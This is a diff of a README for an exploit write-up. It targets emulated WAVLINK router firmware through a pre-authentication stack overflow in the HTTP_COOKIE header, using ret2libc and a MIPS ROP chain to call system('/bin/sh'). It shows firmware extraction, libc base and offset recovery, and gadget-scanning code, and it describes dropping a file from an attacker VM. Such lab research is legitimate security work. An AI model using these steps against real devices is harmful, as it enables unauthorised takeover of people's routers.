@@ -5,6 +5,24 @@ This project demonstrates the complete exploitation chain, resulting in unauthen
 
 The exploit overflows a stack buffer via the `HTTP_COOKIE` header, hijacks the instruction pointer ($ra), and executes a ROP chain `(ret2libc)` to call system`("/bin/sh")`. then I leverage the shell to force the router to download a file from my attacker VM directly into its web root (Arbitrary File Drop).
 
+
+| Metric | Details |
+| :--- | :--- |
+| **CVE ID** | Pending Assignment |
+| **Vulnerability Type** | CWE-121: Stack-based Buffer Overflow |
+| **Target Architecture** | MIPS32 Little Endian (MIPS32 LE) |
+| **Exploit Primitive** | Instruction Pointer (`$ra`) Control via `ret2libc` |
+| **Impact** | Pre-Authentication Remote Code Execution (RCE) |
+
+### Binary Environment 
+
+NX (No-Execute): Enabled — Direct shellcode execution on the stack is prevented.
+
+ASLR / PIE: Disabled — Consistent with standard embedded Linux configurations, Address Space Layout Randomization is completely absent. Base library addresses remain fixed across reboots.
+
+Stack Canaries: Disabled — Memory structures lack protective guard values, meaning function return addresses can be directly overwritten without triggering an abort sequence.
+
+
 ### Prerequisites
 **Target:** Emulated WAVLINK firmware running via Lighttpd + QEMU user-mode.
 
@@ -15,12 +33,12 @@ The exploit overflows a stack buffer via the `HTTP_COOKIE` header, hijacks the i
 ## 2. Lab Setup & Emulation
 
 ## 2.1 Acquire the Firmware
-I Place the firmware image in a dedicated lab directory.
+To inspect the vulnerability safely without risking physical hardware,I Place the firmware image in a dedicated lab directory.
 
 ![alt text](/screenshots/0.png)
 
 ## 2.2  Firmware Extraction
-Extract the filesystem using `binwalk:`
+I Extract the filesystem using `binwalk:`
 
 ```bash
 binwalk -Me WAVLINK_WN535M1-M35M1_V250922-WO-GD.bin
@@ -121,10 +139,13 @@ cat /proc/$PID/maps | grep libc
 
 80c00000-80cdf000 r-xp 00000000 08:02 3933340 ... /lib/libc.so
 
-0x80c00000. This is LIBC_BASE address.
+0x80c00000. 
+
+From this output, I established that libc.so loads deterministically at a base address of 0x80c00000.
 
 ## 5.3 Find the Function and String Offsets
-Now I look inside libc.so to find the offsets for system() and "/bin/sh":
+
+With my baseline library address verified, I look inside lib/libc.so binary file directly to find offsets of the system() function and the runtime target string "/bin/sh".
 
 ```bash
 readelf -Ds lib/libc.so | grep system
@@ -147,9 +168,9 @@ Calculate their final addresses:
 
 
 ## 5.4 ROP Gadget address
-Find a gadget that moves arguments into the correct registers and jumps to system(). move $a0, $s0; move $t9, $s2; jalr $t9.
+To pass control cleanly into system("/bin/sh") on a MIPS platform without relying on stack layout flags, I needed a specific assembly instruction sequence: move $a0, $s0; move $t9, $s2; jalr $t9.
 
-find its exact offset in my specific libc.so using Python:
+Instead of guessing, I wrote a custom Python script to scan the raw binary of libc.so for the precise hex opcodes representing these instructions:
 ```bash
 python3 -c "
 data = open('lib/libc.so', 'rb').read()
@@ -240,4 +261,6 @@ wget http://127.0.0.1/pwned.txt
 ```
 ![alt text](/screenshots/op1.png) ![alt text](/screenshots/op2.png)
 
+
+<video src="exploit_demo.mp4" controls width="800"></video>
 
